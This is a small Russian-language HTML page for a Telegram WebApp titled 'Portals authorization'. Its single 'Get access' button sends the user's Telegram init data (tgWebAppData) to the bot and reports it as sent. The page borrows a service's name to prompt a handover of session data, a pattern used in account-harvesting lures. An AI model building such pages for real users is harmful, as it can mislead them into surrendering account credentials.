<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Авторизация Portals</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
    button { padding: 15px 30px; font-size: 18px; cursor: pointer; }
  </style>
</head>
<body>
  <h1>Авторизация Portals</h1>
  <p>Нажми кнопку, чтобы авторизоваться</p>
  <button id="authBtn">Получить доступ</button>

  <script>
    // Проверяем, что Telegram WebApp доступен
    const tg = window.Telegram.WebApp;

    const btn = document.getElementById('authBtn');
    btn.addEventListener('click', () => {
      // Отправляем Telegram-боту tgWebAppData
      tg.sendData(tg.initData);
      btn.innerText = "✅ Данные отправлены!";
      btn.disabled = true;
    });
  </script>
</body>
</html>
